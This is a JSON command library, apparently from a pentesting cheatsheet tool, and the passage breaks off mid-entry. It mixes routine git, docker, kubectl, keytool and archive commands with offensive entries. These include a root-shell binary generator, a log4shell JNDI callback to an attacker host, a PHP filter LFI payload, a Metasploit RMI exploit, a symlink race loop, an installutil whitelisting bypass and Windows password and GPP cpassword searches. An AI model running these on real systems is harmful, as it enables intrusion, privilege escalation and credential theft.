{"commands": [{"name": "generate shell bash bin", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "'int main(void){setreuid(0,0); system(\"/bin/bash\"); return 0;}' > pwn.c;\\\ngcc pwn.c -o <filename|shell>;\\\nrm pwn.c", "tags": "[\"c\", \"shell\"]", "more_info_url": null}, {"name": "command execution", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.js\" -e \"^\\(.*\\s\\|.*child_process.*|\\)\\(exec\\|spawn\\|eval\\|execSync\\|spawnSync\\|execFileSync\\)(\" --color", "tags": "[\"whitebox\", \"nodejs\"]", "more_info_url": null}, {"name": "require", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.js\" -e \"^\\(.*\\s\\|\\)\\(require\\)(\" --color", "tags": "[\"whitebox\", \"nodejs\"]", "more_info_url": null}, {"name": "file", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.js\" -e \"^\\(.*\\s\\|\\)\\(appendFile\\|open\\|readFile\\|WriteFile\\\\|unlink\\|rename\\|formidable)(\" --color", "tags": "[\"whitebox\", \"nodejs\"]", "more_info_url": null}, {"name": "initial new package", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "init", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "initial immediately a new package", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "init -y", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install all dependencies packages", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "install", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install all dev dependencies packages", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "install --save-dev", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install a specified package", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "install <package_name>", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install a specified dev package", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "install <package_name> --save-dev", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install globally a specified package", "description": "", "executable_type": "custom", "executable_path": "npm", "arguments": "install <package_name> -g", "tags": "[\"npm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "install a specified version of node", "description": "", "executable_type": "custom", "executable_path": "nvm", "arguments": "install <version>", "tags": "[\"nvm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "list available versions", "description": "", "executable_type": "custom", "executable_path": "nvm", "arguments": "ls-remote", "tags": "[\"nvm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "use installed node's version", "description": "", "executable_type": "custom", "executable_path": "nvm", "arguments": "use <version>", "tags": "[\"nvm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "set a node's version as default", "description": "", "executable_type": "custom", "executable_path": "nvm", "arguments": "alias default <version>", "tags": "[\"nvm\", \"node\", \"js\"]", "more_info_url": null}, {"name": "php grep include", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(include\\|require\\|virtual\\|require_once\\|include_once\\)\\(\\s\\|(\\).*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep path traversal", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(readfile\\|file_get_contents\\|stream_get_contents\\|show_source\\|fopen\\|file\\|fpassthru\\|gzopen\\|gzfile\\|gzpassthru\\|readgzfile\\)\\(\\s\\|(\\).*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep exec", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(eval\\|popen\\|pcntl_exec\\|assert\\|proc_open\\|create_function\\|call_user_func\\|call_user_func_array\\|exec\\|shell_exec\\|system\\|passthru\\|virtual\\)([^)]*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep replace", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(preg_replace\\|ereg_replace\\|eregi_replace\\|mb_ereg_replace\\|mb_eregi_replace\\)(.*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep unserialize", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)unserialize(.*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep ldap", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)ldap_search(.*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep xpath", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)xpath.*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep mail", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)mail(.*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep echo", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(echo\\|printf\\|print\\)\\(\\s\\|(\\).*\\\\$\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep weak comparison", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"\\(\\\\\\$[^=]\\|0\\)\\s*==\\s*\\(0\\|\\\\\\$[^=]\\\\)\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep entry points", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"\\(\\$_GET\\|\\$_POST\\|\\$_FILES\\|\\$REQUEST\\|\\$_COOKIES\\|\\$_SESSION\\|\\$_SERVER\\|\\$_GLOBALS\\)\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep callbacks", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"^\\(.*\\s\\|\\)\\(ob_start\\|array_diff_uassoc\\|array_diff_ukey\\|array_filter\\|array_intersect_uassoc\\|array_intersect_ukey\\|array_map\\|array_reduce\\|array_udiff_assoc\\|array_udiff_uassoc\\|array_udiff\\|array_uintersect_assoc\\|array_uintersect_uassoc\\|array_uintersect\\|array_walk_recursive\\|array_walk\\|assert_options\\|uasort\\|uksort\\|usort\\|preg_replace_callback\\|spl_autoload_register\\|iterator_apply\\|register_shutdown_function\\|register_tick_function\\|set_error_handler\\|set_exception_handler\\|session_set_save_handler\\|sqlite_create_aggregate\\|sqlite_create_function\\)(.*\\\\$\"", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep curl", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rn --include \"*.php\" -e \"curl_exec\" --color", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep where or query", "description": "", "executable_type": "custom", "executable_path": "grep", "arguments": "-rni --include \"*.php\" -e \"\\(where\\|query\\).*\\\\$\"", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php grep file not contain an auth file include", "description": "", "executable_type": "custom", "executable_path": "for", "arguments": "f in *.php; do grep \"/include/auth.php\" $f || echo $f; done |grep -v include | grep -v require", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "php wrapper lfi", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "<url>?<param>=php://filter/read=convert.base64-encode/resource=<file>.php", "tags": "[\"php\", \"whitebox\"]", "more_info_url": null}, {"name": "DotNetToJScript", "description": "", "executable_type": "custom", "executable_path": "DotNetToJScript.exe", "arguments": "<dll|ExampleAssembly.dll> --lang=Jscript --ver=v4 -o <jscript|runner.js>", "tags": null, "more_info_url": null}, {"name": "Generate a Java keystore and key pair", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-genkey -alias <ALIAS> -keyalg RSA -keystore <OUTPUT_JKS> -keysize <RSA_LENGTH>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Generate a certificate signing request (CSR) for an existing Java keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-certreq -alias <ALIAS> -keystore <INPUT_JKS> -file <OUTPUT_CSR>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Import a root or intermediate CA certificate to an existing Java keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-import -trustcacerts -alias root -file <INPUT_CRT> -keystore <INPUT_JKS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Import a signed primary certificate to an existing Java keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-import -trustcacerts -alias <ALIAS> -file <INPUT_CRT> -keystore <INPUT_JKS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Generate a keystore and self-signed certificate", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-genkey -keyalg RSA -alias <ALIAS> -keystore <OUTPUT_JKS> -storepass <PASSWORD> -validity <VALIDITY> -keysize <RSA_LENGTH>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Check a stand-alone certificate", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-printcert -v -file <INPUT_CRT>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Check which certificates are in a Java keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-list -v -keystore <INPUT_JKS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Check a particular keystore entry using an alias", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-list -v -keystore <INPUT_JKS> -alias <ALIAS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Remove a certificate from a keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-delete -alias <ALIAS> -keystore <INPUT_JKS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Change the password of a keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-storepasswd -keystore <INPUT_JKS> -new <NEW_PASSWORD>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Export a certificate from a keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-export -alias <ALIAS> -file <OUTPUT_CRT> -keystore <INPUT_JKS>", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "List the trusted CA Certs from the default Java Trusted Certs Keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-list -v -keystore $JAVA_HOME/jre/lib/security/cacerts", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "Import New Certificate Authority into the default Java Trusted Certs Keystore", "description": "", "executable_type": "custom", "executable_path": "keytool", "arguments": "-import -trustcacerts -file <INPUT_PEM> -alias <ALIAS> -keystore $JAVA_HOME/jre/lib/security/cacerts", "tags": "[\"java keytool\", \"certificate\", \"encryption\"]", "more_info_url": null}, {"name": "RMI", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploit/multi/misc/java_rmi_server\"", "tags": "[\"java\"]", "more_info_url": null}, {"name": "log4shell find", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "-H 'User-Agent: ${jndi:ldap://<lhost>:<lport>}' <ip>", "tags": "[\"java\"]", "more_info_url": null}, {"name": "Create a tar containing files", "description": "", "executable_type": "custom", "executable_path": "tar", "arguments": "cf <name>.tar <files>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Extract the files from a tar", "description": "", "executable_type": "custom", "executable_path": "tar", "arguments": "xf <tar_file>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Create a tar with Gzip compression", "description": "", "executable_type": "custom", "executable_path": "tar", "arguments": "czf <name>.tar.gz <files>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Extract a tar using Gzip", "description": "", "executable_type": "custom", "executable_path": "tar", "arguments": "xzf <targz_file>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Compress file and appends .gz to its name", "description": "", "executable_type": "custom", "executable_path": "gzip", "arguments": "<path>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Decompress compressed file", "description": "", "executable_type": "custom", "executable_path": "gzip", "arguments": "-d <gz_file>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "create zip file", "description": "", "executable_type": "custom", "executable_path": "zip", "arguments": "<file>.zip <files_to_zip>", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "zip all the files of current directory", "description": "", "executable_type": "custom", "executable_path": "zip", "arguments": "<file>.zip *", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "zip folder", "description": "", "executable_type": "custom", "executable_path": "zip", "arguments": "-r <file>.zip <folder>", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "add file to a zip archive", "description": "", "executable_type": "custom", "executable_path": "zip", "arguments": "-u <file>.zip <file_to_add>", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "view zip content", "description": "", "executable_type": "custom", "executable_path": "zipinfo", "arguments": "<file>.zip", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "create zip file with symlink (useful for path traversal)", "description": "", "executable_type": "custom", "executable_path": "zip", "arguments": "--symlinks <file>.zip <symlink_file>", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "list detailed zip file content", "description": "", "executable_type": "custom", "executable_path": "unzip", "arguments": "-Z <file>.zip", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "unzip file", "description": "", "executable_type": "custom", "executable_path": "unzip", "arguments": "<file>.zip", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "unzip file to directory", "description": "", "executable_type": "custom", "executable_path": "unzip", "arguments": "<file>.zip -d <destination_folder>", "tags": "[\"archive\", \"compress\"]", "more_info_url": null}, {"name": "Compress dir to rar file", "description": "", "executable_type": "custom", "executable_path": "rar", "arguments": "a <dir>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "Decompress rar file", "description": "", "executable_type": "custom", "executable_path": "unrar", "arguments": "x <file>.rar", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "7z create archive with password", "description": "", "executable_type": "custom", "executable_path": "7z", "arguments": "a <archive_name>.7z -p<password> <file>", "tags": "[\"archive\"]", "more_info_url": null}, {"name": "change a file by a symlink when found", "description": "", "executable_type": "custom", "executable_path": "while", "arguments": "true ; do N=<file_to_search> ; if [[ -r $N ]] ; then rm $N ; ln -s <symlink_target_file> $N ; break; fi ; done", "tags": "[\"toctou\", \"race condition\"]", "more_info_url": null}, {"name": "Set global git user name", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "config --global user.name <name>", "tags": null, "more_info_url": null}, {"name": "Set global git user email", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "config --global user.email <email>", "tags": null, "more_info_url": null}, {"name": "Initializes a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "init", "tags": null, "more_info_url": null}, {"name": "Clone a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "clone -b <branch_name> <repository> <clone_directory>", "tags": null, "more_info_url": null}, {"name": "View all available remote for a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "remote --verbose", "tags": null, "more_info_url": null}, {"name": "Adds a remote for a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "remote add <remote_name> <remote_url>", "tags": null, "more_info_url": null}, {"name": "Renames a remote for a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "remote rename <old_remote_name> <new_remote_name>", "tags": null, "more_info_url": null}, {"name": "Remove a remote for a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "remote remove <remote_name>", "tags": null, "more_info_url": null}, {"name": "Checkout to branch", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "checkout <branch>", "tags": null, "more_info_url": null}, {"name": "Displays the current status of a git repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "status", "tags": null, "more_info_url": null}, {"name": "Displays unstaged changes for file", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "diff <unstaged_files>", "tags": null, "more_info_url": null}, {"name": "Stage single or multiple files", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "add <changed_files>;", "tags": null, "more_info_url": null}, {"name": "Stage all files in project", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "add -A", "tags": null, "more_info_url": null}, {"name": "Saves the changes to a file in a commit", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "commit -m <message>", "tags": null, "more_info_url": null}, {"name": "Pushes committed changes to remote repository", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "push -u <remote_name> <branch_name>", "tags": null, "more_info_url": null}, {"name": "Pushes changes to a remote repository overwriting another branch", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "push <remote_name> <branch>:<branch_to_overwrite>", "tags": null, "more_info_url": null}, {"name": "Overwrites remote branch with local branch changes", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "push <remote_name> <branch_name> -f", "tags": null, "more_info_url": null}, {"name": "Pulls changes to a remote repo to the local repo", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "pull --ff-only", "tags": null, "more_info_url": null}, {"name": "Merges changes on one branch into current branch", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "merge <branch_name>", "tags": null, "more_info_url": null}, {"name": "Abort the current conflict resolution process, and try to reconstruct the pre-merge state.", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "merge --abort", "tags": null, "more_info_url": null}, {"name": "Displays log of commits for a repo", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "log", "tags": null, "more_info_url": null}, {"name": "Displays formatted log of commits for a repo", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "log --all --decorate --oneline --graph", "tags": null, "more_info_url": null}, {"name": "Clear everything", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "clean -dxf", "tags": null, "more_info_url": null}, {"name": "Sign all commits in a branch based on master", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "rebase master -S -f", "tags": null, "more_info_url": null}, {"name": "Checkout a branch from a fork", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "fetch origin pull/<pr_number>/head:pr/<pr_number> && git checkout pr/<pr_number>", "tags": null, "more_info_url": null}, {"name": "Add a new module", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "submodule add <repository> <path>", "tags": null, "more_info_url": null}, {"name": "Update module", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "submodule update --init", "tags": null, "more_info_url": null}, {"name": "Update module without init", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "submodule update", "tags": null, "more_info_url": null}, {"name": "Pull all submodules", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "submodule foreach git pull origin master", "tags": null, "more_info_url": null}, {"name": "Update all submodules", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "submodule update --init --recursive", "tags": null, "more_info_url": null}, {"name": "Skip git hooks", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "commit --no-verify", "tags": null, "more_info_url": null}, {"name": "Create new branch from current HEAD", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "checkout -b <new_branch_name>", "tags": null, "more_info_url": null}, {"name": "pull remote branch and switch to it", "description": "", "executable_type": "custom", "executable_path": "git", "arguments": "checkout -b <new_branch_name> <remote>/<branch_name>", "tags": null, "more_info_url": null}, {"name": "git dump", "description": "", "executable_type": "custom", "executable_path": "gitdumper", "arguments": "<url>/.git/ <destination_dir>", "tags": null, "more_info_url": null}, {"name": "Print all contexts", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "config get-contexts", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Print current context of kubeconfig", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "config current-context", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Set context of kubeconfig", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "config use-context <context>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Print resource documentation", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "explain <resource>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get nodes (add option '-o wide' for details)", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get nodes", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get namespaces", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get namespaces", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get pods from namespace (add option '-o wide' for details)", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get pods -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get pods from all namespace (add option '-o wide' for details)", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get pods --all-namespaces", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get services from namespace", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get services -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get details from resource on namespace", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "describe <resource>/<name> -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Print logs from namespace", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "logs -f pods/<name> -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Get deployments", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "get deployments -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Edit deployments", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "edit deployment/<name> -n <namespace>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Drain node in preparation for maintenance", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "drain <name>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Mark node as schedulable", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "uncordon <name>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Mark node as unschedulable", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "cordon <name>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Display resource (cpu/memory/storage) usage", "description": "", "executable_type": "custom", "executable_path": "kubectl", "arguments": "top <type>", "tags": "[\"kubernetes\", \"k8s\", \"kubectl\"]", "more_info_url": null}, {"name": "Remove an image", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "image rm <image_id>", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Delete an image from the local image store", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "rmi <image_id>", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "List all images that are locally stored with the Docker engine", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "images", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Build an image from the Dockerfile in the current directory and tag the image", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "build -t <image>:<version> .", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Pull an image from a registry", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "pull <image>:<version>", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Stop a running container through SIGTERM", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "stop <container_id>", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Stop a running container through SIGKILL", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "kill <container_id>", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "List the networks", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "network ls", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "List the running containers", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "ps", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Delete all running and stopped containers", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "rm -f $(docker ps -aq)", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Create a new bash process inside the container and connect it to the terminal", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "exec -it <container_id> bash", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Print the last lines of a container\u2019s logs", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "logs --tail 100 <container_id> | less", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Print the last lines of a container's logs and following its logs", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "logs --tail 100 <container_id> -f", "tags": "[\"docker\", \"container\"]", "more_info_url": null}, {"name": "Create new network", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "network create <network_name>", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Builds, (re)creates, starts, and attaches to containers for all services", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "up", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Builds, (re)creates, starts, and dettaches to containers for all services", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "up -d", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Builds, (re)creates, starts, and attaches to containers for a service", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "up -d <service_name>", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Builds, (re)creates, starts, and dettaches to containers for a service", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "up -d <service_name>", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Print the last lines of a service\u2019s logs", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "logs --tail 100 <service_name> | less", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Print the last lines of a service's logs and following its logs", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "logs -f --tail 100 <service_name>", "tags": "[\"docker-compose\"]", "more_info_url": null}, {"name": "Stops containers and removes containers, networks created by up", "description": "", "executable_type": "custom", "executable_path": "docker-compose", "arguments": "down", "tags": "[\"docker\", \"mysql\"]", "more_info_url": null}, {"name": "run mysql container", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "run --rm --name=<container_name|mysql8> -e MYSQL_ALLOW_EMPTY_PASSWORD=yes -d mysql/mysql-server:<version|latest>", "tags": "[\"docker\", \"mysql\"]", "more_info_url": null}, {"name": "connect to mysql docker container", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "exec -ti <container_name> mysql", "tags": "[\"docker\", \"mysql\"]", "more_info_url": null}, {"name": "whitelisting bypass with installutil", "description": "", "executable_type": "custom", "executable_path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe", "arguments": "/logfile= /LogToConsole=false /U <full_path_to_app>", "tags": "[\"application whitelisting\", \"clm\"]", "more_info_url": null}, {"name": "get info system limited", "description": "", "executable_type": "custom", "executable_path": "systeminfo", "arguments": "| findstr /B /C:\"OS Name\" /C:\"OS Version\"", "tags": null, "more_info_url": null}, {"name": "find passwords", "description": "", "executable_type": "custom", "executable_path": "findstr", "arguments": "/si 'password' *.txt *.xml *.docx", "tags": null, "more_info_url": null}, {"name": "find passwords - group policy preference (ms14-025)", "description": "", "executable_type": "custom", "executable_path": "findstr", "arguments": "/S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml", "tags": null, "more_info_url": null}, {"name": "get patches", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "qfe get Caption,Description,HotFixID,InstalledOn", "tags": null, "more_info_url": null}, {"name": "dns request for DC", "description": "", "executable_type": "custom", "executable_path": "nslookup", "arguments": "-type=any <userdnsdomain>.", "tags": null, "more_info_url": null}, {"name": "show mounted disks", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "logicaldisk get caption,description,providername", "tags": null, "more_info_url": null}, {"name": "show recycle bin", "description": "", "executable_type": "custom", "executable_path": "dir", "arguments": "C:\\$Recycle.Bin /s /b", "tags": null, "more_info_url": null}, {"name": "get architecture", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%", "tags": null, "more_info_url": null}, {"name": "list scheduled tasks", "description": "", 